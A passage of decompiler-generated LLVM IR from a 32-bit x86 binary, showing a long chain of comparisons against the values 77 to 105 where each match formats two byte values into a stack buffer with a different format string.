dec_label_pc_804a90f:                             ; preds = %dec_label_pc_804a909
  %v0_804a90f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a90f = zext i8 %v0_804a90f to i32
  store i32 %v1_804a90f, i32* @edx, align 4
  %v0_804a91b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a91b = zext i8 %v0_804a91b to i32
  %v2_804a92a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a92a, i32* @ebx, align 4
  %v5_804a931 = call i32 @szprintf(i32 %v2_804a92a, i32 ptrtoint ([13 x i8]* @global_var_805895e.105 to i32), i32 %v1_804a91b, i32 %v1_804a90f)
  br label %dec_label_pc_804a939

dec_label_pc_804a939:                             ; preds = %dec_label_pc_804a909, %dec_label_pc_804a90f
  %v12_804a939 = icmp eq i32 %v11_8049ac4, 77
  %v1_804a93d = icmp eq i1 %v12_804a939, false
  br i1 %v1_804a93d, label %dec_label_pc_804a969, label %dec_label_pc_804a93f

dec_label_pc_804a93f:                             ; preds = %dec_label_pc_804a939
  %v0_804a93f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a93f = zext i8 %v0_804a93f to i32
  store i32 %v1_804a93f, i32* @edx, align 4
  %v0_804a94b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a94b = zext i8 %v0_804a94b to i32
  %v2_804a95a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a95a, i32* @ebx, align 4
  %v5_804a961 = call i32 @szprintf(i32 %v2_804a95a, i32 ptrtoint ([13 x i8]* @global_var_805896b.106 to i32), i32 %v1_804a94b, i32 %v1_804a93f)
  br label %dec_label_pc_804a969

dec_label_pc_804a969:                             ; preds = %dec_label_pc_804a939, %dec_label_pc_804a93f
  %v12_804a969 = icmp eq i32 %v11_8049ac4, 78
  %v1_804a96d = icmp eq i1 %v12_804a969, false
  br i1 %v1_804a96d, label %dec_label_pc_804a999, label %dec_label_pc_804a96f

dec_label_pc_804a96f:                             ; preds = %dec_label_pc_804a969
  %v0_804a96f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a96f = zext i8 %v0_804a96f to i32
  store i32 %v1_804a96f, i32* @edx, align 4
  %v0_804a97b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a97b = zext i8 %v0_804a97b to i32
  %v2_804a98a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a98a, i32* @ebx, align 4
  %v5_804a991 = call i32 @szprintf(i32 %v2_804a98a, i32 ptrtoint ([13 x i8]* @global_var_8058978.107 to i32), i32 %v1_804a97b, i32 %v1_804a96f)
  br label %dec_label_pc_804a999

dec_label_pc_804a999:                             ; preds = %dec_label_pc_804a969, %dec_label_pc_804a96f
  %v12_804a999 = icmp eq i32 %v11_8049ac4, 79
  %v1_804a99d = icmp eq i1 %v12_804a999, false
  br i1 %v1_804a99d, label %dec_label_pc_804a9c9, label %dec_label_pc_804a99f

dec_label_pc_804a99f:                             ; preds = %dec_label_pc_804a999
  %v0_804a99f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a99f = zext i8 %v0_804a99f to i32
  store i32 %v1_804a99f, i32* @edx, align 4
  %v0_804a9ab = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a9ab = zext i8 %v0_804a9ab to i32
  %v2_804a9ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9ba, i32* @ebx, align 4
  %v5_804a9c1 = call i32 @szprintf(i32 %v2_804a9ba, i32 ptrtoint ([13 x i8]* @global_var_8058985.108 to i32), i32 %v1_804a9ab, i32 %v1_804a99f)
  br label %dec_label_pc_804a9c9

dec_label_pc_804a9c9:                             ; preds = %dec_label_pc_804a999, %dec_label_pc_804a99f
  %v9_804a9c9 = icmp eq i32 %v11_8049ac4, 80
  %v1_804a9cd = icmp eq i1 %v9_804a9c9, false
  br i1 %v1_804a9cd, label %dec_label_pc_804a9f9, label %dec_label_pc_804a9cf

dec_label_pc_804a9cf:                             ; preds = %dec_label_pc_804a9c9
  %v0_804a9cf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a9cf = zext i8 %v0_804a9cf to i32
  store i32 %v1_804a9cf, i32* @edx, align 4
  %v0_804a9db = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a9db = zext i8 %v0_804a9db to i32
  %v2_804a9ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9ea, i32* @ebx, align 4
  %v5_804a9f1 = call i32 @szprintf(i32 %v2_804a9ea, i32 ptrtoint ([13 x i8]* @global_var_8058992.109 to i32), i32 %v1_804a9db, i32 %v1_804a9cf)
  br label %dec_label_pc_804a9f9

dec_label_pc_804a9f9:                             ; preds = %dec_label_pc_804a9c9, %dec_label_pc_804a9cf
  %v12_804a9f9 = icmp eq i32 %v11_8049ac4, 81
  %v1_804a9fd = icmp eq i1 %v12_804a9f9, false
  br i1 %v1_804a9fd, label %dec_label_pc_804aa29, label %dec_label_pc_804a9ff

dec_label_pc_804a9ff:                             ; preds = %dec_label_pc_804a9f9
  %v0_804a9ff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a9ff = zext i8 %v0_804a9ff to i32
  store i32 %v1_804a9ff, i32* @edx, align 4
  %v0_804aa0b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804aa0b = zext i8 %v0_804aa0b to i32
  %v2_804aa1a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa1a, i32* @ebx, align 4
  %v5_804aa21 = call i32 @szprintf(i32 %v2_804aa1a, i32 ptrtoint ([13 x i8]* @global_var_805899f.110 to i32), i32 %v1_804aa0b, i32 %v1_804a9ff)
  br label %dec_label_pc_804aa29

dec_label_pc_804aa29:                             ; preds = %dec_label_pc_804a9f9, %dec_label_pc_804a9ff
  %v12_804aa29 = icmp eq i32 %v11_8049ac4, 82
  %v1_804aa2d = icmp eq i1 %v12_804aa29, false
  br i1 %v1_804aa2d, label %dec_label_pc_804aa59, label %dec_label_pc_804aa2f

dec_label_pc_804aa2f:                             ; preds = %dec_label_pc_804aa29
  %v0_804aa2f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804aa2f = zext i8 %v0_804aa2f to i32
  store i32 %v1_804aa2f, i32* @edx, align 4
  %v0_804aa3b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804aa3b = zext i8 %v0_804aa3b to i32
  %v2_804aa4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa4a, i32* @ebx, align 4
  %v5_804aa51 = call i32 @szprintf(i32 %v2_804aa4a, i32 ptrtoint ([13 x i8]* @global_var_80589ac.111 to i32), i32 %v1_804aa3b, i32 %v1_804aa2f)
  br label %dec_label_pc_804aa59

dec_label_pc_804aa59:                             ; preds = %dec_label_pc_804aa29, %dec_label_pc_804aa2f
  %v12_804aa59 = icmp eq i32 %v11_8049ac4, 83
  %v1_804aa5d = icmp eq i1 %v12_804aa59, false
  br i1 %v1_804aa5d, label %dec_label_pc_804aa89, label %dec_label_pc_804aa5f

dec_label_pc_804aa5f:                             ; preds = %dec_label_pc_804aa59
  %v0_804aa5f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804aa5f = zext i8 %v0_804aa5f to i32
  store i32 %v1_804aa5f, i32* @edx, align 4
  %v0_804aa6b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804aa6b = zext i8 %v0_804aa6b to i32
  %v2_804aa7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa7a, i32* @ebx, align 4
  %v5_804aa81 = call i32 @szprintf(i32 %v2_804aa7a, i32 ptrtoint ([13 x i8]* @global_var_80589b9.112 to i32), i32 %v1_804aa6b, i32 %v1_804aa5f)
  br label %dec_label_pc_804aa89

dec_label_pc_804aa89:                             ; preds = %dec_label_pc_804aa59, %dec_label_pc_804aa5f
  %v12_804aa89 = icmp eq i32 %v11_8049ac4, 84
  %v1_804aa8d = icmp eq i1 %v12_804aa89, false
  br i1 %v1_804aa8d, label %dec_label_pc_804aab9, label %dec_label_pc_804aa8f

dec_label_pc_804aa8f:                             ; preds = %dec_label_pc_804aa89
  %v0_804aa8f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804aa8f = zext i8 %v0_804aa8f to i32
  store i32 %v1_804aa8f, i32* @edx, align 4
  %v0_804aa9b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804aa9b = zext i8 %v0_804aa9b to i32
  %v2_804aaaa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaaa, i32* @ebx, align 4
  %v5_804aab1 = call i32 @szprintf(i32 %v2_804aaaa, i32 ptrtoint ([13 x i8]* @global_var_80589c6.113 to i32), i32 %v1_804aa9b, i32 %v1_804aa8f)
  br label %dec_label_pc_804aab9

dec_label_pc_804aab9:                             ; preds = %dec_label_pc_804aa89, %dec_label_pc_804aa8f
  %v12_804aab9 = icmp eq i32 %v11_8049ac4, 85
  %v1_804aabd = icmp eq i1 %v12_804aab9, false
  br i1 %v1_804aabd, label %dec_label_pc_804aae9, label %dec_label_pc_804aabf

dec_label_pc_804aabf:                             ; preds = %dec_label_pc_804aab9
  %v0_804aabf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804aabf = zext i8 %v0_804aabf to i32
  store i32 %v1_804aabf, i32* @edx, align 4
  %v0_804aacb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804aacb = zext i8 %v0_804aacb to i32
  %v2_804aada = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aada, i32* @ebx, align 4
  %v5_804aae1 = call i32 @szprintf(i32 %v2_804aada, i32 ptrtoint ([13 x i8]* @global_var_80589d3.114 to i32), i32 %v1_804aacb, i32 %v1_804aabf)
  br label %dec_label_pc_804aae9

dec_label_pc_804aae9:                             ; preds = %dec_label_pc_804aab9, %dec_label_pc_804aabf
  %v12_804aae9 = icmp eq i32 %v11_8049ac4, 86
  %v1_804aaed = icmp eq i1 %v12_804aae9, false
  br i1 %v1_804aaed, label %dec_label_pc_804ab19, label %dec_label_pc_804aaef

dec_label_pc_804aaef:                             ; preds = %dec_label_pc_804aae9
  %v0_804aaef = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804aaef = zext i8 %v0_804aaef to i32
  store i32 %v1_804aaef, i32* @edx, align 4
  %v0_804aafb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804aafb = zext i8 %v0_804aafb to i32
  %v2_804ab0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab0a, i32* @ebx, align 4
  %v5_804ab11 = call i32 @szprintf(i32 %v2_804ab0a, i32 ptrtoint ([13 x i8]* @global_var_80589e0.115 to i32), i32 %v1_804aafb, i32 %v1_804aaef)
  br label %dec_label_pc_804ab19

dec_label_pc_804ab19:                             ; preds = %dec_label_pc_804aae9, %dec_label_pc_804aaef
  %v12_804ab19 = icmp eq i32 %v11_8049ac4, 87
  %v1_804ab1d = icmp eq i1 %v12_804ab19, false
  br i1 %v1_804ab1d, label %dec_label_pc_804ab49, label %dec_label_pc_804ab1f

dec_label_pc_804ab1f:                             ; preds = %dec_label_pc_804ab19
  %v0_804ab1f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ab1f = zext i8 %v0_804ab1f to i32
  store i32 %v1_804ab1f, i32* @edx, align 4
  %v0_804ab2b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ab2b = zext i8 %v0_804ab2b to i32
  %v2_804ab3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab3a, i32* @ebx, align 4
  %v5_804ab41 = call i32 @szprintf(i32 %v2_804ab3a, i32 ptrtoint ([13 x i8]* @global_var_80589ed.116 to i32), i32 %v1_804ab2b, i32 %v1_804ab1f)
  br label %dec_label_pc_804ab49

dec_label_pc_804ab49:                             ; preds = %dec_label_pc_804ab19, %dec_label_pc_804ab1f
  %v12_804ab49 = icmp eq i32 %v11_8049ac4, 88
  %v1_804ab4d = icmp eq i1 %v12_804ab49, false
  br i1 %v1_804ab4d, label %dec_label_pc_804ab79, label %dec_label_pc_804ab4f

dec_label_pc_804ab4f:                             ; preds = %dec_label_pc_804ab49
  %v0_804ab4f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ab4f = zext i8 %v0_804ab4f to i32
  store i32 %v1_804ab4f, i32* @edx, align 4
  %v0_804ab5b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ab5b = zext i8 %v0_804ab5b to i32
  %v2_804ab6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab6a, i32* @ebx, align 4
  %v5_804ab71 = call i32 @szprintf(i32 %v2_804ab6a, i32 ptrtoint ([13 x i8]* @global_var_80589fa.117 to i32), i32 %v1_804ab5b, i32 %v1_804ab4f)
  br label %dec_label_pc_804ab79

dec_label_pc_804ab79:                             ; preds = %dec_label_pc_804ab49, %dec_label_pc_804ab4f
  %v12_804ab79 = icmp eq i32 %v11_8049ac4, 89
  %v1_804ab7d = icmp eq i1 %v12_804ab79, false
  br i1 %v1_804ab7d, label %dec_label_pc_804aba9, label %dec_label_pc_804ab7f

dec_label_pc_804ab7f:                             ; preds = %dec_label_pc_804ab79
  %v0_804ab7f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ab7f = zext i8 %v0_804ab7f to i32
  store i32 %v1_804ab7f, i32* @edx, align 4
  %v0_804ab8b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ab8b = zext i8 %v0_804ab8b to i32
  %v2_804ab9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab9a, i32* @ebx, align 4
  %v5_804aba1 = call i32 @szprintf(i32 %v2_804ab9a, i32 ptrtoint ([13 x i8]* @global_var_8058a07.118 to i32), i32 %v1_804ab8b, i32 %v1_804ab7f)
  br label %dec_label_pc_804aba9

dec_label_pc_804aba9:                             ; preds = %dec_label_pc_804ab79, %dec_label_pc_804ab7f
  %v12_804aba9 = icmp eq i32 %v11_8049ac4, 90
  %v1_804abad = icmp eq i1 %v12_804aba9, false
  br i1 %v1_804abad, label %dec_label_pc_804abd9, label %dec_label_pc_804abaf

dec_label_pc_804abaf:                             ; preds = %dec_label_pc_804aba9
  %v0_804abaf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804abaf = zext i8 %v0_804abaf to i32
  store i32 %v1_804abaf, i32* @edx, align 4
  %v0_804abbb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804abbb = zext i8 %v0_804abbb to i32
  %v2_804abca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abca, i32* @ebx, align 4
  %v5_804abd1 = call i32 @szprintf(i32 %v2_804abca, i32 ptrtoint ([13 x i8]* @global_var_8058a14.119 to i32), i32 %v1_804abbb, i32 %v1_804abaf)
  br label %dec_label_pc_804abd9

dec_label_pc_804abd9:                             ; preds = %dec_label_pc_804aba9, %dec_label_pc_804abaf
  %v12_804abd9 = icmp eq i32 %v11_8049ac4, 91
  %v1_804abdd = icmp eq i1 %v12_804abd9, false
  br i1 %v1_804abdd, label %dec_label_pc_804ac09, label %dec_label_pc_804abdf

dec_label_pc_804abdf:                             ; preds = %dec_label_pc_804abd9
  %v0_804abdf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804abdf = zext i8 %v0_804abdf to i32
  store i32 %v1_804abdf, i32* @edx, align 4
  %v0_804abeb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804abeb = zext i8 %v0_804abeb to i32
  %v2_804abfa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abfa, i32* @ebx, align 4
  %v5_804ac01 = call i32 @szprintf(i32 %v2_804abfa, i32 ptrtoint ([13 x i8]* @global_var_8058a21.120 to i32), i32 %v1_804abeb, i32 %v1_804abdf)
  br label %dec_label_pc_804ac09

dec_label_pc_804ac09:                             ; preds = %dec_label_pc_804abd9, %dec_label_pc_804abdf
  %v12_804ac09 = icmp eq i32 %v11_8049ac4, 92
  %v1_804ac0d = icmp eq i1 %v12_804ac09, false
  br i1 %v1_804ac0d, label %dec_label_pc_804ac39, label %dec_label_pc_804ac0f

dec_label_pc_804ac0f:                             ; preds = %dec_label_pc_804ac09
  %v0_804ac0f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ac0f = zext i8 %v0_804ac0f to i32
  store i32 %v1_804ac0f, i32* @edx, align 4
  %v0_804ac1b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ac1b = zext i8 %v0_804ac1b to i32
  %v2_804ac2a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac2a, i32* @ebx, align 4
  %v5_804ac31 = call i32 @szprintf(i32 %v2_804ac2a, i32 ptrtoint ([13 x i8]* @global_var_8058a2e.121 to i32), i32 %v1_804ac1b, i32 %v1_804ac0f)
  br label %dec_label_pc_804ac39

dec_label_pc_804ac39:                             ; preds = %dec_label_pc_804ac09, %dec_label_pc_804ac0f
  %v12_804ac39 = icmp eq i32 %v11_8049ac4, 93
  %v1_804ac3d = icmp eq i1 %v12_804ac39, false
  br i1 %v1_804ac3d, label %dec_label_pc_804ac69, label %dec_label_pc_804ac3f

dec_label_pc_804ac3f:                             ; preds = %dec_label_pc_804ac39
  %v0_804ac3f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ac3f = zext i8 %v0_804ac3f to i32
  store i32 %v1_804ac3f, i32* @edx, align 4
  %v0_804ac4b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ac4b = zext i8 %v0_804ac4b to i32
  %v2_804ac5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac5a, i32* @ebx, align 4
  %v5_804ac61 = call i32 @szprintf(i32 %v2_804ac5a, i32 ptrtoint ([13 x i8]* @global_var_8058a3b.122 to i32), i32 %v1_804ac4b, i32 %v1_804ac3f)
  br label %dec_label_pc_804ac69

dec_label_pc_804ac69:                             ; preds = %dec_label_pc_804ac39, %dec_label_pc_804ac3f
  %v12_804ac69 = icmp eq i32 %v11_8049ac4, 94
  %v1_804ac6d = icmp eq i1 %v12_804ac69, false
  br i1 %v1_804ac6d, label %dec_label_pc_804ac99, label %dec_label_pc_804ac6f

dec_label_pc_804ac6f:                             ; preds = %dec_label_pc_804ac69
  %v0_804ac6f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ac6f = zext i8 %v0_804ac6f to i32
  store i32 %v1_804ac6f, i32* @edx, align 4
  %v0_804ac7b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ac7b = zext i8 %v0_804ac7b to i32
  %v2_804ac8a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac8a, i32* @ebx, align 4
  %v5_804ac91 = call i32 @szprintf(i32 %v2_804ac8a, i32 ptrtoint ([13 x i8]* @global_var_80587ad.72 to i32), i32 %v1_804ac7b, i32 %v1_804ac6f)
  br label %dec_label_pc_804ac99

dec_label_pc_804ac99:                             ; preds = %dec_label_pc_804ac69, %dec_label_pc_804ac6f
  %v12_804ac99 = icmp eq i32 %v11_8049ac4, 95
  %v1_804ac9d = icmp eq i1 %v12_804ac99, false
  br i1 %v1_804ac9d, label %dec_label_pc_804acc9, label %dec_label_pc_804ac9f

dec_label_pc_804ac9f:                             ; preds = %dec_label_pc_804ac99
  %v0_804ac9f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ac9f = zext i8 %v0_804ac9f to i32
  store i32 %v1_804ac9f, i32* @edx, align 4
  %v0_804acab = load i8, i8* @global_var_805d499.29, align 1
  %v1_804acab = zext i8 %v0_804acab to i32
  %v2_804acba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acba, i32* @ebx, align 4
  %v5_804acc1 = call i32 @szprintf(i32 %v2_804acba, i32 ptrtoint ([13 x i8]* @global_var_8058a48.123 to i32), i32 %v1_804acab, i32 %v1_804ac9f)
  br label %dec_label_pc_804acc9

dec_label_pc_804acc9:                             ; preds = %dec_label_pc_804ac99, %dec_label_pc_804ac9f
  %v9_804acc9 = icmp eq i32 %v11_8049ac4, 96
  %v1_804accd = icmp eq i1 %v9_804acc9, false
  br i1 %v1_804accd, label %dec_label_pc_804acf9, label %dec_label_pc_804accf

dec_label_pc_804accf:                             ; preds = %dec_label_pc_804acc9
  %v0_804accf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804accf = zext i8 %v0_804accf to i32
  store i32 %v1_804accf, i32* @edx, align 4
  %v0_804acdb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804acdb = zext i8 %v0_804acdb to i32
  %v2_804acea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acea, i32* @ebx, align 4
  %v5_804acf1 = call i32 @szprintf(i32 %v2_804acea, i32 ptrtoint ([13 x i8]* @global_var_80587d4.75 to i32), i32 %v1_804acdb, i32 %v1_804accf)
  br label %dec_label_pc_804acf9

dec_label_pc_804acf9:                             ; preds = %dec_label_pc_804acc9, %dec_label_pc_804accf
  %v12_804acf9 = icmp eq i32 %v11_8049ac4, 97
  %v1_804acfd = icmp eq i1 %v12_804acf9, false
  br i1 %v1_804acfd, label %dec_label_pc_804ad29, label %dec_label_pc_804acff

dec_label_pc_804acff:                             ; preds = %dec_label_pc_804acf9
  %v0_804acff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804acff = zext i8 %v0_804acff to i32
  store i32 %v1_804acff, i32* @edx, align 4
  %v0_804ad0b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ad0b = zext i8 %v0_804ad0b to i32
  %v2_804ad1a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad1a, i32* @ebx, align 4
  %v5_804ad21 = call i32 @szprintf(i32 %v2_804ad1a, i32 ptrtoint ([13 x i8]* @global_var_8058a55.124 to i32), i32 %v1_804ad0b, i32 %v1_804acff)
  br label %dec_label_pc_804ad29

dec_label_pc_804ad29:                             ; preds = %dec_label_pc_804acf9, %dec_label_pc_804acff
  %v12_804ad29 = icmp eq i32 %v11_8049ac4, 98
  %v1_804ad2d = icmp eq i1 %v12_804ad29, false
  br i1 %v1_804ad2d, label %dec_label_pc_804ad59, label %dec_label_pc_804ad2f

dec_label_pc_804ad2f:                             ; preds = %dec_label_pc_804ad29
  %v0_804ad2f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ad2f = zext i8 %v0_804ad2f to i32
  store i32 %v1_804ad2f, i32* @edx, align 4
  %v0_804ad3b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ad3b = zext i8 %v0_804ad3b to i32
  %v2_804ad4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad4a, i32* @ebx, align 4
  %v5_804ad51 = call i32 @szprintf(i32 %v2_804ad4a, i32 ptrtoint ([13 x i8]* @global_var_8058a62.125 to i32), i32 %v1_804ad3b, i32 %v1_804ad2f)
  br label %dec_label_pc_804ad59

dec_label_pc_804ad59:                             ; preds = %dec_label_pc_804ad29, %dec_label_pc_804ad2f
  %v12_804ad59 = icmp eq i32 %v11_8049ac4, 99
  %v1_804ad5d = icmp eq i1 %v12_804ad59, false
  br i1 %v1_804ad5d, label %dec_label_pc_804ad89, label %dec_label_pc_804ad5f

dec_label_pc_804ad5f:                             ; preds = %dec_label_pc_804ad59
  %v0_804ad5f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ad5f = zext i8 %v0_804ad5f to i32
  store i32 %v1_804ad5f, i32* @edx, align 4
  %v0_804ad6b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ad6b = zext i8 %v0_804ad6b to i32
  %v2_804ad7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad7a, i32* @ebx, align 4
  %v5_804ad81 = call i32 @szprintf(i32 %v2_804ad7a, i32 ptrtoint ([13 x i8]* @global_var_8058a6f.126 to i32), i32 %v1_804ad6b, i32 %v1_804ad5f)
  br label %dec_label_pc_804ad89

dec_label_pc_804ad89:                             ; preds = %dec_label_pc_804ad59, %dec_label_pc_804ad5f
  %v12_804ad89 = icmp eq i32 %v11_8049ac4, 100
  %v1_804ad8d = icmp eq i1 %v12_804ad89, false
  br i1 %v1_804ad8d, label %dec_label_pc_804adb9, label %dec_label_pc_804ad8f

dec_label_pc_804ad8f:                             ; preds = %dec_label_pc_804ad89
  %v0_804ad8f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ad8f = zext i8 %v0_804ad8f to i32
  store i32 %v1_804ad8f, i32* @edx, align 4
  %v0_804ad9b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ad9b = zext i8 %v0_804ad9b to i32
  %v2_804adaa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adaa, i32* @ebx, align 4
  %v5_804adb1 = call i32 @szprintf(i32 %v2_804adaa, i32 ptrtoint ([13 x i8]* @global_var_8058a7c.127 to i32), i32 %v1_804ad9b, i32 %v1_804ad8f)
  br label %dec_label_pc_804adb9

dec_label_pc_804adb9:                             ; preds = %dec_label_pc_804ad89, %dec_label_pc_804ad8f
  %v12_804adb9 = icmp eq i32 %v11_8049ac4, 101
  %v1_804adbd = icmp eq i1 %v12_804adb9, false
  br i1 %v1_804adbd, label %dec_label_pc_804ade9, label %dec_label_pc_804adbf

dec_label_pc_804adbf:                             ; preds = %dec_label_pc_804adb9
  %v0_804adbf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804adbf = zext i8 %v0_804adbf to i32
  store i32 %v1_804adbf, i32* @edx, align 4
  %v0_804adcb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804adcb = zext i8 %v0_804adcb to i32
  %v2_804adda = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adda, i32* @ebx, align 4
  %v5_804ade1 = call i32 @szprintf(i32 %v2_804adda, i32 ptrtoint ([13 x i8]* @global_var_8058a89.128 to i32), i32 %v1_804adcb, i32 %v1_804adbf)
  br label %dec_label_pc_804ade9

dec_label_pc_804ade9:                             ; preds = %dec_label_pc_804adb9, %dec_label_pc_804adbf
  %v12_804ade9 = icmp eq i32 %v11_8049ac4, 102
  %v1_804aded = icmp eq i1 %v12_804ade9, false
  br i1 %v1_804aded, label %dec_label_pc_804ae19, label %dec_label_pc_804adef

dec_label_pc_804adef:                             ; preds = %dec_label_pc_804ade9
  %v0_804adef = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804adef = zext i8 %v0_804adef to i32
  store i32 %v1_804adef, i32* @edx, align 4
  %v0_804adfb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804adfb = zext i8 %v0_804adfb to i32
  %v2_804ae0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae0a, i32* @ebx, align 4
  %v5_804ae11 = call i32 @szprintf(i32 %v2_804ae0a, i32 ptrtoint ([12 x i8]* @global_var_8058a96.129 to i32), i32 %v1_804adfb, i32 %v1_804adef)
  br label %dec_label_pc_804ae19

dec_label_pc_804ae19:                             ; preds = %dec_label_pc_804ade9, %dec_label_pc_804adef
  %v12_804ae19 = icmp eq i32 %v11_8049ac4, 103
  %v1_804ae1d = icmp eq i1 %v12_804ae19, false
  br i1 %v1_804ae1d, label %dec_label_pc_804ae49, label %dec_label_pc_804ae1f

dec_label_pc_804ae1f:                             ; preds = %dec_label_pc_804ae19
  %v0_804ae1f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ae1f = zext i8 %v0_804ae1f to i32
  store i32 %v1_804ae1f, i32* @edx, align 4
  %v0_804ae2b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ae2b = zext i8 %v0_804ae2b to i32
  %v2_804ae3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae3a, i32* @ebx, align 4
  %v5_804ae41 = call i32 @szprintf(i32 %v2_804ae3a, i32 ptrtoint ([13 x i8]* @global_var_8058aa2.130 to i32), i32 %v1_804ae2b, i32 %v1_804ae1f)
  br label %dec_label_pc_804ae49

dec_label_pc_804ae49:                             ; preds = %dec_label_pc_804ae19, %dec_label_pc_804ae1f
  %v12_804ae49 = icmp eq i32 %v11_8049ac4, 104
  %v1_804ae4d = icmp eq i1 %v12_804ae49, false
  br i1 %v1_804ae4d, label %dec_label_pc_804ae79, label %dec_label_pc_804ae4f

dec_label_pc_804ae4f:                             ; preds = %dec_label_pc_804ae49
  %v0_804ae4f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ae4f = zext i8 %v0_804ae4f to i32
  store i32 %v1_804ae4f, i32* @edx, align 4
  %v0_804ae5b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ae5b = zext i8 %v0_804ae5b to i32
  %v2_804ae6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae6a, i32* @ebx, align 4
  %v5_804ae71 = call i32 @szprintf(i32 %v2_804ae6a, i32 ptrtoint ([13 x i8]* @global_var_8058aaf.131 to i32), i32 %v1_804ae5b, i32 %v1_804ae4f)
  br label %dec_label_pc_804ae79

dec_label_pc_804ae79:                             ; preds = %dec_label_pc_804ae49, %dec_label_pc_804ae4f
  %v12_804ae79 = icmp eq i32 %v11_8049ac4, 105
  %v1_804ae7d = icmp eq i1 %v12_804ae79, false
  br i1 %v1_804ae7d, label %dec_label_pc_804aea9, label %dec_label_pc_804ae7f

dec_label_pc_804ae7f:                             ; preds = %dec_label_pc_804ae79
  %v0_804ae7f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804ae7f = zext i8 %v0_804ae7f to i32
  store i32 %v1_804ae7f, i32* @edx, align 4
  %v0_804ae8b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804ae8b = zext i8 %v0_804ae8b to i32
  %v2_804ae9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae9a, i32* @ebx, align 4
